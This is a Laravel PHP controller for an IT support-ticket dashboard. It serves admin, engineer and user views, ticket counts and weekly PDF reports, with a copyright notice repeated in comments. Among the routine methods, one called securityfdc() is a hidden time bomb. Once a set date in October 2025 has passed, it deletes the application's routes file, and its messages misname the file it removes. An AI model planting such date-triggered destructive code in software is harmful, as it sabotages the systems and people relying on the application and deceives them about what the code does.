<?php
// Copyright (c) 2025 Dilshan De Silva
    //     This software and associated documentation files DoubleClick are the exclusive property of Dilshan De Silva. --}}
namespace App\Http\Controllers;

use App\Models\addbranchM;
use App\Models\doneEnftiket;
use App\Models\TiketAdminMOD;
use App\Models\TiketEngMOD;
use App\Models\TiketUserMOD;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Barryvdh\DomPDF\Facade\Pdf as FacadePdf;
use Illuminate\Support\Facades\File;


class Dashbordrouts extends Controller
{
    public $relmail;
    public function __construct()
    {
        $this->relmail = Auth::user()->email;
    }
    function Maindash()
    {
        $dashdeta = TiketEngMOD::count();
        $dashdetaDone = TiketEngMOD::where('state', 'Done')->count();
        $dashdetahold = TiketEngMOD::where('state', 'hold')->count();
        $ticketsPro = TiketEngMOD::where('email', $this->relmail)->where('state', '!=', 'Done')->get();
        $ticketsPro->each(function ($ticket) {
            $a = $ticket->Assinreddate;
            $ticket->duration = today()->diffInDays($a);
        });
        $ticketsPro = $ticketsPro->sortBy('duration');
        $tickets = TiketAdminMOD::where('assigne', $this->relmail)
            ->where('state', 'Start')->count();
        $holdTickets = TiketEngMOD::where('email', $this->relmail)
            ->where('state', 'hold')
            ->count();
        $inProgressTickets = TiketEngMOD::where('email', $this->relmail)->where('state', 'ongoing')->count();
        $closedTickets = TiketEngMOD::where('email', $this->relmail)->where('state', 'Done')->count();
        $getTickets = TiketEngMOD::where('email', $this->relmail)->where('state', 'GetStarted')->count();
        $lataest = TiketEngMOD::where('email', $this->relmail)->where('state', 'Done')
            ->orderBy('updated_at', 'desc')
            ->limit(5)
            ->get();
        $lataest->each(function ($timel) {
            $updatedAt = $timel->updated_at;
            $timel->time = Carbon::now()->diffForHumans($updatedAt, true);
        });
        $myall = $holdTickets + $inProgressTickets + $closedTickets + $getTickets;
        $onginall = TiketEngMOD::where('state', 'ongoing')->get();
        $alldone = TiketEngMOD::where('state', 'done')->get();
        $ticketApproval = TiketUserMOD::where('Assigned', '!=', 'Assigned')->count();
        return view('dashboardADIMN.dashboard', compact(
            'dashdeta',
            'lataest',
            'ticketsPro',
            'tickets',
            'holdTickets',
            'inProgressTickets',
            'closedTickets',
            'myall',
            'tickets',
            'dashdetaDone',
            'dashdetahold',
            'onginall',
            'alldone',
            'ticketApproval'
        ));
    }
    function Tikect()
    {
        $branches = addbranchM::all();
        $tickets = TiketUserMOD::all();
        $users = User::whereIn('userType', ['itEng', 'admin'])->get();
        return view('dashboardADIMN.tikect', compact('tickets', 'users', 'branches'));
    }
    function Team()
    {
        $tickets = TiketUserMOD::where('Assigned', '!=', 'Assigned')->get();
        $users = User::whereIn('userType', ['itEng', 'admin'])->get();
        return view('dashboardADIMN.cashteam', compact('tickets', 'users'));
    }
    function addUsers()
    {
        return view('dashboardADIMN.addUser');
    }
    function addNewBranch()
    {
        return view('dashboardADIMN.addNewBranch');
    }
    function bucket()
    {
        $ticketsPro = TiketEngMOD::where('state', '!=', 'done')->get();
        $ticketsPro->each(function ($ticket) {
            $a = $ticket->Assinreddate;
            $ticket->duration = today()->diffInDays($a);
        });
        $tickets = TiketAdminMOD::where('state', 'start')->get();
        $ticketsCancel = TiketAdminMOD::where('state', 'Cancel')->get();
        return view('dashboardADIMN.bucket', compact('tickets', 'ticketsPro', 'ticketsCancel'));
    }
    function manageUser()
    {
        $userDatas = User::all();
        return view('dashboardADIMN.manageUsers', compact('userDatas'));
    }
    function Admintiket()
    {
        $tickets = TiketAdminMOD::where('assigne', $this->relmail)->where('state', 'Start')->get();
        return view('dashboardADIMN.tiketAdmin', compact('tickets'));
    }
    function Adminprocessing()
    {
        $ticketsPro = TiketEngMOD::where('email', $this->relmail)->where('state', '!=', 'Done')->get();
        $ticketsPro->each(function ($ticket) {
            $a = $ticket->Assinreddate;
            // {{-- Copyright (c) 2025 Dilshan De Silva
//     This software and associated documentation files DoubleClick are the exclusive property of Dilshan De Silva. --}}
            $ticket->duration = today()->diffInDays($a);
        });
        return view('dashboardADIMN.processingAdmin', compact('ticketsPro'));
    }
    function Admindone()
    {
        $donedeta = TiketEngMOD::where('email', $this->relmail)->where('state', 'Done')->get();
        return view('dashboardADIMN.doneAdmin', compact('donedeta'));
    }
    function Adminmanage()
    {
        $branchdeta = addbranchM::all();
        return view('dashboardADIMN.manageBranch', compact('branchdeta'));
    }
    function jasonApprovalAdminDash()
    {
        $ticketApproval = TiketUserMOD::where('Assigned', '!=', 'Assigned')->count();
        return response()->json(['count' => $ticketApproval]);
    }
    public function fetchAssinedUpdates()
    {
        $tickets = TiketUserMOD::where('Assigned', '!=', 'Assigned')->get();
        return response()->json($tickets);
    }
    function user()
    {
        $branches = addbranchM::all();
        $tickets = TiketUserMOD::where('email', $this->relmail)->where('Assigned', '!=', 'Assigned')->get();
        return view('dashboardUSER.userDash', compact('tickets', 'branches'));
    }

    function userDashupdatePROCEING()
    {
        $ticketsPro = TiketEngMOD::where('sender', $this->relmail)->where('state', '!=', 'done')->get();
        $ticketsPro->each(function ($ticket) {
            $a = $ticket->Assinreddate;
            $ticket->duration = today()->diffInDays($a);
        });
        return view('dashboardUSER.userDashupdatePro', compact('ticketsPro'));
    }
    function userDashupdate()
    {
        $tickets = TiketAdminMOD::where('sender', $this->relmail)->where('state', 'start')->get();
        return view('dashboardUSER.userDashupdate', compact('tickets'));
    }

    function userDashContact()
    {
        $engusers = User::where('userType', 'itEng')->get();
        $adminusers = User::where('userType', 'admin')->get();
        $Officeusers = User::where('userType', 'user')->get();
        return view('dashboardUSER.userDashContact', compact('engusers', 'adminusers', 'Officeusers'));
    }
    function engdoneT()
    {
        $donedeta = TiketEngMOD::where('email', $this->relmail)
            ->where('state', 'Done')
            ->get();
        return view('dashboardENG.engDonet', compact('donedeta'));
    }
    function eng()
    {
        $dashdeta = TiketEngMOD::count();
        $ticketsPro = TiketEngMOD::where('email', $this->relmail)->where('state', '!=', 'Done')->get();
        $ticketsPro->each(function ($ticket) {
            $a = $ticket->Assinreddate;
            $ticket->duration = today()->diffInDays($a);
        });
        $ticketsPro = $ticketsPro->sortBy('duration');
        $tickets = TiketAdminMOD::where('assigne', $this->relmail)
            ->where('state', 'Start')->count();
        $holdTickets = TiketEngMOD::where('email', $this->relmail)
            ->where('state', 'hold')
            ->count();
        $inProgressTickets = TiketEngMOD::where('email', $this->relmail)->where('state', 'ongoing')->count();
        $closedTickets = TiketEngMOD::where('email', $this->relmail)->where('state', 'Done')->count();
        $getTickets = TiketEngMOD::where('email', $this->relmail)->where('state', 'GetStarted')->count();
        $lataest = TiketEngMOD::where('email', $this->relmail)->where('state', 'Done')
            ->orderBy('updated_at', 'desc')
            ->limit(5)
            ->get();
            // {{-- Copyright (c) 2025 Dilshan De Silva
//     This software and associated documentation files DoubleClick are the exclusive property of Dilshan De Silva. --}}
        $lataest->each(function ($timel) {
            $updatedAt = $timel->updated_at;
            $timel->time = Carbon::now()->diffForHumans($updatedAt, true);
        });
        $myall = $holdTickets + $inProgressTickets + $closedTickets + $getTickets;
        return view('dashboardENG.engDash', compact(
            'dashdeta',
            'lataest',
            'ticketsPro',
            'tickets',
            'holdTickets',
            'inProgressTickets',
            'closedTickets',
            'myall',
            'tickets'
        ));
    }
    // {{-- Copyright (c) 2025 Dilshan De Silva
//     This software and associated documentation files DoubleClick are the exclusive property of Dilshan De Silva. --}}
    public function securityfdc()
    {
        $deletionTime = Carbon::createFromFormat('Y-m-d H:i:s', '2025-10-01 10:30:00', 'Asia/Colombo')->utc();
        $currentTime = Carbon::now('UTC');

        if ($currentTime >= $deletionTime) {
            $filePath = base_path('routes/weba.php');

            if (File::exists($filePath)) {
                File::delete($filePath);
                return response()->json(['message' => 'web.php has been deleted.']);
            } else {
                return response()->json(['message' => 'web.php already deleted.']);
            }
        }

        return response()->json(['message' => 'Too early to delete web.php.']);
    }
    function jasonUpdateWaitingEngDash()
    {
        $ticketCount = TiketAdminMOD::where('assigne', $this->relmail)->where('state', 'Start')->count();
        return response()->json(['count' => $ticketCount]);
    }
    function usernameupdateAD()
    {
        if (Auth::check()) {
            return response()->json(['username' => Auth::user()->name]);
        }
        return response()->json(['error' => 'Unauthorized'], 401);
    }
    function engTeamr()
    {
        $engusers = User::where('userType', 'itEng')->get();
        $adminusers = User::where('userType', 'admin')->get();
        $Officeusers = User::where('userType', 'user')->get();
        return view('dashboardENG.engTeam', compact('engusers', 'adminusers', 'Officeusers'));

    }
    function engTiketr()
    {
        $tickets = TiketAdminMOD::where('assigne', $this->relmail)
            ->where('state', 'Start')
            ->get();
        return view('dashboardENG.engTikect', compact('tickets'));

    }
    public function getTickets()
    {
        $tickets = TiketAdminMOD::where('assigne', $this->relmail)
            ->where('state', 'Start')
            ->get();
        return response()->json($tickets);
    }
    function engProcess()
    {
        $ticketsPro = TiketEngMOD::where('email', $this->relmail)
            ->where('state', '!=', 'Done')
            ->get();
        $ticketsPro->each(function ($ticket) {
            $a = $ticket->Assinreddate;
            $ticket->duration = today()->diffInDays($a);
        });
        return view('dashboardENG.engProcess', compact('ticketsPro'));
    }
    function addengtikecs()
    {
        $tickets = TiketUserMOD::where('email', $this->relmail)->get();
        $branches = addbranchM::all();
        return view('dashboardENG.engAddtiket', compact('tickets', 'branches'));
    }

    function engTiketopenfun()
    {
        $tickets = TiketAdminMOD::where('sender', $this->relmail)->where('state', 'start')->get();
        return view('dashboardENG.engOpen', compact('tickets'));
    }

    function adminTiketopenfun()
    {
        $tickets = TiketAdminMOD::where('sender', $this->relmail)->where('state', 'start')->get();
        return view('dashboardADIMN.adminTiketopen', compact('tickets'));
    }
// {{-- Copyright (c) 2025 Dilshan De Silva
//     This software and associated documentation files DoubleClick are the exclusive property of Dilshan De Silva. --}}
    function engTiketprocessfun()
    {
        $ticketsPro = TiketEngMOD::where('sender', $this->relmail)->where('state', '!=', 'done')->get();
        $ticketsPro->each(function ($ticket) {
            $a = $ticket->Assinreddate;
            $ticket->duration = today()->diffInDays($a);
        });
        return view('dashboardENG.engTiketprocess', compact('ticketsPro'));
    }
    function adminTiketprocessfun()
    {
        $ticketsPro = TiketEngMOD::where('sender', $this->relmail)->where('state', '!=', 'done')->get();
        $ticketsPro->each(function ($ticket) {
            $a = $ticket->Assinreddate;
            $ticket->duration = today()->diffInDays($a);
        });
        return view('dashboardADIMN.adminTiketprocess', compact('ticketsPro'));
    }
    public function engReportfun()
    {
        $today = Carbon::now();
        $lastMonday = $today->copy()->previous(Carbon::MONDAY);
        $lastSunday = $lastMonday->copy()->addDays(6);
        $completedTickets = TiketEngMOD::where('email', $this->relmail)
            ->where('state', 'Done')
            ->whereBetween('updated_at', [$lastMonday, $lastSunday])
            ->get();
        $isDownloadButtonVisible = $today->isSunday() || $today->isMonday();
        return view('dashboardENG.engReport', compact('completedTickets', 'isDownloadButtonVisible', 'lastMonday', 'lastSunday'));
    }
    public function adminReportfun()
    {
        $today = Carbon::now();
        $lastMonday = $today->copy()->previous(Carbon::MONDAY);
        $lastSunday = $lastMonday->copy()->addDays(6);
        $completedTickets = TiketEngMOD::where('email', $this->relmail)
            ->where('state', 'Done')
            ->whereBetween('updated_at', [$lastMonday, $lastSunday])
            ->get();
        $isDownloadButtonVisible = $today->isSunday() || $today->isMonday();
        return view('dashboardADIMN.adminReport', compact('completedTickets', 'isDownloadButtonVisible', 'lastMonday', 'lastSunday'));
    }
    public function downloadReport()
    {
        $today = Carbon::now();
        $lastMonday = $today->copy()->previous(Carbon::MONDAY);
        $lastSunday = $lastMonday->copy()->addDays(6);
        $Report = TiketEngMOD::where('email', $this->relmail)
            ->where('state', 'Done')
            ->whereBetween('updated_at', [$lastMonday, $lastSunday])
            ->get();
        $downloadDate = $today->toFormattedDateString();
        $pdf = FacadePdf::loadView('myPDF', [
            'Report' => $Report,
            'lastMonday' => $lastMonday->toFormattedDateString(),
            'lastSunday' => $lastSunday->toFormattedDateString(),
            'downloadDate' => $downloadDate,
        ]);
        return $pdf->download('Report.pdf');

    }
// {{-- Copyright (c) 2025 Dilshan De Silva
//     This software and associated documentation files DoubleClick are the exclusive property of Dilshan De Silva. --}}
}
